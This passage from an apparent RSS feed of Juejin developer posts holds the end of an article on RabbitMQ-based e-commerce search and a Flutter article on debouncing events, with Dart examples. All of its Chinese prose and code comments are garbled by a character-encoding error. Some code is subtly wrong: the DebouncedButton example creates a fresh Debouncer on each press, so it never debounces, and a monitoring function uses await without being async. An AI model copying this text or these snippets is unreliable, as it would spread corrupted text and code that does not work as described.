<li>å¼€å¯æ¶ˆæ¯æ‰¹é‡å‘é€ä¸æ¶ˆè´¹ï¼Œå‡å°‘ç½‘ç»œ IO å¼€é”€ï¼›</li>
<li>é˜Ÿåˆ—ç»‘å®šæ­»ä¿¡äº¤æ¢æœºï¼Œé¿å…æ¶ˆæ¯ä¸¢å¤±ï¼ŒåŒæ—¶æ§åˆ¶é‡è¯•æ¬¡æ•°é˜²æ­¢æ­»å¾ªç¯ï¼›</li>
</ul>
</li>
<li>
<p><strong>ES ä¼˜åŒ–</strong>ï¼šåˆç†è®¾ç½®åˆ†ç‰‡ä¸å‰¯æœ¬æ•°ï¼Œè°ƒæ•´ç´¢å¼•åˆ·æ–°é—´éš”ï¼Œä¼˜åŒ–æŸ¥è¯¢è¯­å¥ï¼ˆé¿å…å…¨ç´¢å¼•æ‰«æï¼‰ï¼›</p>
</li>
<li>
<p><strong>ç¼“å­˜ä¼˜åŒ–</strong>ï¼šå¤šçº§ç¼“å­˜è®¾è®¡ï¼Œç¼“å­˜é¢„çƒ­ä¸ä¸»åŠ¨å¤±æ•ˆç»“åˆï¼Œæå‡ç¼“å­˜å‘½ä¸­ç‡è‡³ 90%+ï¼›</p>
</li>
<li>
<p><strong>ä»£ç ä¼˜åŒ–</strong>ï¼šé¿å…é‡å¤æŸ¥è¯¢ï¼Œä½¿ç”¨æµå¼å¤„ç†ï¼Œå‡å°‘å¯¹è±¡åˆ›å»ºï¼Œæå‡ä»£ç æ‰§è¡Œæ•ˆç‡ã€‚</p>
</li>
</ul>
<h3 data-id="heading-26">äº”ã€ç”Ÿäº§éƒ¨ç½²æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-27">1. RabbitMQ éƒ¨ç½²å»ºè®®</h4>
<ul>
<li><strong>ç¯å¢ƒé…ç½®</strong>ï¼šç”Ÿäº§ç¯å¢ƒå»ºè®® 3 èŠ‚ç‚¹é›†ç¾¤éƒ¨ç½²ï¼ˆé•œåƒé˜Ÿåˆ—æ¨¡å¼ï¼‰ï¼Œä¿éšœé«˜å¯ç”¨ï¼›</li>
<li><strong>èµ„æºé…ç½®</strong>ï¼šCPU 2-4 æ ¸ï¼Œå†…å­˜ 4-8GBï¼Œç£ç›˜é€‰æ‹© SSDï¼Œé¿å…æ¶ˆæ¯å†™å…¥å»¶è¿Ÿï¼›</li>
<li><strong>æŒä¹…åŒ–é…ç½®</strong>ï¼šå¼€å¯é˜Ÿåˆ—ä¸æ¶ˆæ¯æŒä¹…åŒ–ï¼Œé˜²æ­¢æœåŠ¡é‡å¯åæ¶ˆæ¯ä¸¢å¤±ï¼›</li>
<li><strong>é™æµé…ç½®</strong>ï¼šé€šè¿‡ <code>prefetchCount</code> æ§åˆ¶æ¶ˆè´¹è€…æ¯æ¬¡æ‹‰å–æ¶ˆæ¯æ•°é‡ï¼Œé¿å…æ¶ˆè´¹ç«¯è¿‡è½½ã€‚</li>
</ul>
<h4 data-id="heading-28">2. æ•°æ®ä¸€è‡´æ€§ä¿éšœ</h4>
<ul>
<li>é‡‡ç”¨ â€œäº‹ä»¶é©±åŠ¨ + æœ€ç»ˆä¸€è‡´æ€§â€ æ–¹æ¡ˆï¼Œå•†å“å˜æ›´äº‹ä»¶é€šè¿‡ RabbitMQ å¼‚æ­¥åŒæ­¥ï¼Œå¤±è´¥æ—¶è¿›å…¥æ­»ä¿¡é˜Ÿåˆ—é‡è¯•ï¼›</li>
<li>ç¼“å­˜ä¸ ES/MySQL åŒæ­¥é‡‡ç”¨ â€œæ›´æ–°åå¤±æ•ˆâ€ ç­–ç•¥ï¼Œé¿å…ç¼“å­˜è„æ•°æ®ï¼›</li>
<li>å…³é”®ä¸šåŠ¡ï¼ˆå¦‚è®¢å•åˆ›å»ºï¼‰å¯é€šè¿‡æœ¬åœ°æ¶ˆæ¯è¡¨ + RabbitMQ å®ç°å¯é æ¶ˆæ¯æŠ•é€’ã€‚</li>
</ul>
<h4 data-id="heading-29">3. ç›‘æ§ä¸å‘Šè­¦</h4>
<ul>
<li>æ¥å…¥ Prometheus + Grafana ç›‘æ§ RabbitMQ é˜Ÿåˆ—é•¿åº¦ã€æ¶ˆæ¯å †ç§¯é‡ã€æ¶ˆè´¹é€Ÿç‡ï¼›</li>
<li>é…ç½®å…³é”®æŒ‡æ ‡å‘Šè­¦ï¼ˆå¦‚é˜Ÿåˆ—å †ç§¯è¶… 1000 æ¡ã€æ¶ˆè´¹å¤±è´¥ç‡è¶… 5%ï¼‰ï¼›</li>
<li>æ—¥å¿—æ”¶é›†é‡‡ç”¨ ELK æ ˆï¼Œä¾¿äºæ’æŸ¥æ¶ˆæ¯å‘é€ / æ¶ˆè´¹å¼‚å¸¸ã€‚</li>
</ul>
<h3 data-id="heading-30">å…­ã€æ€»ç»“</h3>
<p>æœ¬æ–‡åŸºäº <strong>SpringCloud + Elasticsearch + Redis + RabbitMQ</strong> æŠ€æœ¯æ ˆï¼Œå®Œæ•´å®ç°äº†ä¸€å¥—é«˜æ€§èƒ½ç”µå•†å®æ—¶æœç´¢ä¸ä¸ªæ€§åŒ–æ¨èç³»ç»Ÿï¼Œé‡ç‚¹çªå‡ºäº† RabbitMQ åœ¨æ•°æ®åŒæ­¥ã€äº‹ä»¶åˆ†å‘ã€ç³»ç»Ÿè§£è€¦ä¸­çš„æ ¸å¿ƒä½œç”¨ã€‚è¯¥æ–¹æ¡ˆé€‚åˆä¸­å°è§„æ¨¡ç”µå•†å¹³å°ï¼Œå…·æœ‰éƒ¨ç½²è½»é‡ã€å¯é æ€§é«˜ã€å¼€å‘æˆæœ¬ä½ç­‰ä¼˜åŠ¿ï¼Œå¯å¿«é€Ÿè½åœ°å¹¶è§£å†³ä¼ ç»Ÿæœç´¢æ¨èæ–¹æ¡ˆçš„æ ¸å¿ƒç—›ç‚¹ã€‚</p>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œå¯æ ¹æ®ä¸šåŠ¡è§„æ¨¡çµæ´»æ‰©å±•ï¼šå°å‹ç”µå•†å¯ç®€åŒ–éƒ¨ç½²ï¼ˆå•èŠ‚ç‚¹ RabbitMQ + ES å•èŠ‚ç‚¹ï¼‰ï¼Œä¸­å¤§å‹ç”µå•†å¯å‡çº§ä¸º RabbitMQ é›†ç¾¤ + ES åˆ†ç‰‡é›†ç¾¤ + Redis é›†ç¾¤ï¼Œè¿›ä¸€æ­¥æå‡ç³»ç»Ÿååé‡ä¸å¯ç”¨æ€§ã€‚é€šè¿‡ä¸æ–­ä¼˜åŒ–æœç´¢ç®—æ³•ã€æ¨èç­–ç•¥ä¸æ¶ˆæ¯é˜Ÿåˆ—é…ç½®ï¼Œå¯æŒç»­æå‡ç”¨æˆ·ä½“éªŒä¸å¹³å°è½¬åŒ–æ•ˆç‡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutteräº‹ä»¶é˜²æŠ–æ•´ç†ï¼ˆåˆç‰ˆï¼‰]]></title>    <link>https://juejin.cn/post/7596845113281249289</link>    <guid>https://juejin.cn/post/7596845113281249289</guid>    <pubDate>2026-01-19T12:08:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596845113281249289" data-draft-id="7596687697756504074" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutteräº‹ä»¶é˜²æŠ–æ•´ç†ï¼ˆåˆç‰ˆï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-19T12:08:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å–ç«ç®­çš„å°ç”·å­©"/> <meta itemprop="url" content="https://juejin.cn/user/4457847613830523"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutteräº‹ä»¶é˜²æŠ–æ•´ç†ï¼ˆåˆç‰ˆï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4457847613830523/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å–ç«ç®­çš„å°ç”·å­©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T12:08:00.000Z" title="Mon Jan 19 2026 12:08:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. <strong>å¸¸è§éœ€è¦é˜²æŠ–çš„äº‹ä»¶ç±»å‹</strong></h2>
<h3 data-id="heading-1">a) ç”¨æˆ·äº¤äº’äº‹ä»¶</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// æŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼ˆé˜²æ­¢é‡å¤æäº¤ï¼‰</span>
ElevatedButton(
  onPressed: debounce(() {
    <span class="hljs-comment">// æäº¤è¡¨å•ã€è·³è½¬é¡µé¢ç­‰</span>
  }),
)

<span class="hljs-comment">// æœç´¢æ¡†è¾“å…¥</span>
TextField(
  onChanged: debounce((value) {
    <span class="hljs-comment">// æœç´¢è¯·æ±‚</span>
  }),
)

<span class="hljs-comment">// æ»šåŠ¨ç›‘å¬</span>
ScrollController().addListener(debounce(() {
  <span class="hljs-comment">// åŠ è½½æ›´å¤š</span>
}))
</code></pre>
<h3 data-id="heading-2">b) ç³»ç»Ÿäº‹ä»¶</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// çª—å£å¤§å°å˜åŒ–</span>
Window.onMetricsChanged = debounce(() {
  <span class="hljs-comment">// é‡æ–°å¸ƒå±€</span>
});

<span class="hljs-comment">// é”®ç›˜äº‹ä»¶</span>
RawKeyboard.instance.addListener(debounce((event) {
  <span class="hljs-comment">// é”®ç›˜å¤„ç†</span>
}));
</code></pre>
<h2 data-id="heading-3">2. <strong>é˜²æŠ–å®ç°æ–¹æ¡ˆ</strong></h2>
<h3 data-id="heading-4">æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨ç°æœ‰åº“</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pubspec.yaml</span>
<span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter_debounce:</span> <span class="hljs-string">^2.0.0</span>
</code></pre>
<h3 data-id="heading-5">æ–¹æ¡ˆäºŒï¼šè‡ªå®šä¹‰é˜²æŠ–å·¥å…·ç±»</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Debouncer</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> delay;
  Timer? _timer;
  
  Debouncer({<span class="hljs-keyword">this</span>.delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">500</span>)});
  
  <span class="hljs-keyword">void</span> call(<span class="hljs-keyword">void</span> <span class="hljs-built_in">Function</span>() action) {
    _timer?.cancel();
    _timer = Timer(delay, action);
  }
  
  <span class="hljs-keyword">void</span> dispose() {
    _timer?.cancel();
  }
}

<span class="hljs-comment">// æ‰©å±•æ–¹æ³•ï¼Œæ–¹ä¾¿ä½¿ç”¨</span>
<span class="hljs-keyword">extension</span> FunctionExtensions <span class="hljs-keyword">on</span> <span class="hljs-built_in">Function</span> {
  VoidCallback debounce([<span class="hljs-built_in">Duration</span> delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>)]) {
    <span class="hljs-keyword">final</span> debouncer = Debouncer(delay: delay);
    <span class="hljs-keyword">return</span> () =&gt; debouncer.call(() =&gt; <span class="hljs-keyword">this</span>());
  }
}
</code></pre>
<h3 data-id="heading-6">æ–¹æ¡ˆä¸‰ï¼šå¸¦å‚æ•°çš„é˜²æŠ–</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ParamDebouncer</span>&lt;<span class="hljs-title">T</span>&gt; </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> delay;
  Timer? _timer;
  <span class="hljs-keyword">void</span> <span class="hljs-built_in">Function</span>(T)? _callback;
  
  ParamDebouncer({<span class="hljs-keyword">this</span>.delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>)});
  
  <span class="hljs-keyword">void</span> run(T value, <span class="hljs-keyword">void</span> <span class="hljs-built_in">Function</span>(T) callback) {
    _callback = callback;
    _timer?.cancel();
    _timer = Timer(delay, () {
      <span class="hljs-keyword">if</span> (_callback != <span class="hljs-keyword">null</span>) {
        _callback!(value);
      }
    });
  }
  
  <span class="hljs-keyword">void</span> dispose() {
    _timer?.cancel();
  }
}
</code></pre>
<h2 data-id="heading-7">3. <strong>ä¸åŒç±»å‹äº‹ä»¶çš„é˜²æŠ–ç­–ç•¥</strong></h2>



































<table><thead><tr><th>äº‹ä»¶ç±»å‹</th><th>æ¨èé˜²æŠ–æ—¶é—´</th><th>æ³¨æ„äº‹é¡¹</th></tr></thead><tbody><tr><td><strong>æŒ‰é’®ç‚¹å‡»</strong></td><td>300-500ms</td><td>é˜²æ­¢é‡å¤æäº¤ï¼Œä½†è¦ç¡®ä¿ç”¨æˆ·ä½“éªŒ</td></tr><tr><td><strong>æœç´¢è¾“å…¥</strong></td><td>500-800ms</td><td>æ ¹æ®æœç´¢APIå“åº”æ—¶é—´è°ƒæ•´</td></tr><tr><td><strong>æ»šåŠ¨ç›‘å¬</strong></td><td>150-300ms</td><td>é¿å…é¢‘ç¹è®¡ç®—ï¼Œä½†è¦ä¿æŒæµç•…æ€§</td></tr><tr><td><strong>çª—å£è°ƒæ•´</strong></td><td>300-500ms</td><td>é¿å…é¢‘ç¹é‡ç»˜</td></tr><tr><td><strong>æ‰‹åŠ¿æ‹–æ‹½</strong></td><td>100-200ms</td><td>ä¿æŒå“åº”æ€§</td></tr></tbody></table>
<h2 data-id="heading-8">4. <strong>é›†æˆåˆ°ç°æœ‰é¡¹ç›®çš„æ­¥éª¤</strong></h2>
<h3 data-id="heading-9">æ­¥éª¤1ï¼šè¯†åˆ«éœ€è¦é˜²æŠ–çš„åœºæ™¯</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// æ£€æŸ¥ä»¥ä¸‹å¸¸è§åœºæ™¯ï¼š</span>
<span class="hljs-comment">// 1. è¡¨å•æäº¤æŒ‰é’®</span>
<span class="hljs-comment">// 2. æœç´¢æ¡†å®æ—¶æœç´¢</span>
<span class="hljs-comment">// 3. æ— é™æ»šåŠ¨åŠ è½½æ›´å¤š</span>
<span class="hljs-comment">// 4. å¤æ‚çš„onChangedå›è°ƒ</span>
<span class="hljs-comment">// 5. é¢‘ç¹è§¦å‘çš„äº‹ä»¶ç›‘å¬å™¨</span>
</code></pre>
<h3 data-id="heading-10">æ­¥éª¤2ï¼šåˆ›å»ºé˜²æŠ–åŒ…è£…å™¨</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DebouncedWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> debounceDelay;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">Type</span>, <span class="hljs-built_in">Duration</span>&gt; eventSpecificDelays;
  
  <span class="hljs-keyword">const</span> DebouncedWidget({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child,
    <span class="hljs-keyword">this</span>.debounceDelay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>),
    <span class="hljs-keyword">this</span>.eventSpecificDelays = <span class="hljs-keyword">const</span> {},
  });
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// ä½¿ç”¨InheritedWidgetæˆ–Providerä¼ é€’debouncer</span>
    <span class="hljs-keyword">return</span> child;
  }
}
</code></pre>
<h3 data-id="heading-11">æ­¥éª¤3ï¼šä½¿ç”¨Mixinç®€åŒ–é˜²æŠ–é›†æˆ</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">mixin</span> DebounceMixin&lt;T <span class="hljs-keyword">extends</span> StatefulWidget&gt; <span class="hljs-keyword">on</span> State&lt;T&gt; {
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, Timer&gt; _timers = {};
  
  <span class="hljs-keyword">void</span> debounce(
    <span class="hljs-built_in">String</span> key,
    VoidCallback callback, {
    <span class="hljs-built_in">Duration</span> delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>),
  }) {
    _timers[key]?.cancel();
    _timers[key] = Timer(delay, () {
      callback();
      _timers.remove(key);
    });
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _timers.values.forEach((timer) =&gt; timer.cancel());
    _timers.clear();
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h2 data-id="heading-12">5. <strong>å®é™…åº”ç”¨ç¤ºä¾‹</strong></h2>
<h3 data-id="heading-13">ç¤ºä¾‹1ï¼šé˜²æŠ–æœç´¢</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SearchPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _SearchPageState createState() =&gt; _SearchPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SearchPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SearchPage</span>&gt; </span>{
  <span class="hljs-keyword">final</span> Debouncer _searchDebouncer = Debouncer(
    delay: <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">500</span>),
  );
  <span class="hljs-keyword">final</span> TextEditingController _controller = TextEditingController();
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> TextField(
      controller: _controller,
      onChanged: (value) {
        _searchDebouncer(() {
          _performSearch(value);
        });
      },
    );
  }
  
  <span class="hljs-keyword">void</span> _performSearch(<span class="hljs-built_in">String</span> query) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// APIè°ƒç”¨</span>
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _searchDebouncer.dispose();
    _controller.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h3 data-id="heading-14">ç¤ºä¾‹2ï¼šé˜²æŠ–æŒ‰é’®</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DebouncedButton</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> VoidCallback onPressed;
  <span class="hljs-keyword">final</span> Widget child;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> debounceDuration;
  
  <span class="hljs-keyword">const</span> DebouncedButton({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.onPressed,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child,
    <span class="hljs-keyword">this</span>.debounceDuration = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">500</span>),
  });
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ElevatedButton(
      onPressed: () {
        Debouncer(delay: debounceDuration).call(onPressed);
      },
      child: child,
    );
  }
}
</code></pre>
<h2 data-id="heading-15">6. <strong>æ³¨æ„äº‹é¡¹</strong></h2>
<ol>
<li>
<p><strong>å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ç¡®ä¿åœ¨Stateçš„disposeä¸­å–æ¶ˆæ‰€æœ‰Timer</li>
<li>ä½¿ç”¨<code>cancel</code>è€Œä¸æ˜¯<code>dispose</code>ï¼ˆå¦‚æœTimerä¸æ”¯æŒdisposeï¼‰</li>
</ul>
</li>
<li>
<p><strong>ç”¨æˆ·ä½“éªŒ</strong></p>
<ul>
<li>é˜²æŠ–æ—¶é—´ä¸å®œè¿‡é•¿ï¼Œå¦åˆ™ä¼šæ„Ÿè§‰å¡é¡¿</li>
<li>å¯¹äºç«‹å³åé¦ˆçš„æ“ä½œï¼ˆå¦‚æŒ‰é’®ç‚¹å‡»åŠ¨ç”»ï¼‰ä¸åº”ä½¿ç”¨é˜²æŠ–</li>
</ul>
</li>
<li>
<p><strong>æµ‹è¯•</strong></p>
<pre><code class="hljs language-dart" lang="dart">test(<span class="hljs-string">'é˜²æŠ–åŠŸèƒ½æµ‹è¯•'</span>, () <span class="hljs-keyword">async</span> {
  <span class="hljs-built_in">int</span> callCount = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">final</span> debounced = Debouncer(delay: <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">100</span>));
  
  debounced(() =&gt; callCount++);
  debounced(() =&gt; callCount++);
  
  <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">150</span>));
  expect(callCount, <span class="hljs-number">1</span>);
});
</code></pre>
</li>
<li>
<p><strong>é…ç½®åŒ–</strong></p>
<ul>
<li>é€šè¿‡é…ç½®æ–‡ä»¶ç®¡ç†ä¸åŒç¯å¢ƒçš„é˜²æŠ–æ—¶é—´</li>
<li>æ”¯æŒå¼€å‘ç¯å¢ƒä¸‹ç¦ç”¨é˜²æŠ–ä»¥ä¾¿è°ƒè¯•</li>
</ul>
</li>
</ol>
<h2 data-id="heading-16">7. <strong>æ€§èƒ½ç›‘æ§</strong></h2>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// æ·»åŠ é˜²æŠ–å‰åçš„æ€§èƒ½å¯¹æ¯”</span>
<span class="hljs-keyword">void</span> _monitorPerformance() {
  <span class="hljs-keyword">final</span> stopwatch = <span class="hljs-built_in">Stopwatch</span>();
  
  <span class="hljs-comment">// é˜²æŠ–å‰</span>
  stopwatch.start();
  <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    _expensiveOperation();
  }
  <span class="hljs-built_in">print</span>(<span class="hljs-string">'é˜²æŠ–å‰: <span class="hljs-subst">${stopwatch.elapsedMilliseconds}</span>ms'</span>);
  
  <span class="hljs-comment">// é˜²æŠ–å</span>
  stopwatch.reset();
  <span class="hljs-keyword">final</span> debouncer = Debouncer(delay: <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">10</span>));
  <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    debouncer(() =&gt; _expensiveOperation());
  }
  <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">200</span>));
  <span class="hljs-built_in">print</span>(<span class="hljs-string">'é˜²æŠ–å: <span class="hljs-subst">${stopwatch.elapsedMilliseconds}</span>ms'</span>);
}
</code></pre>
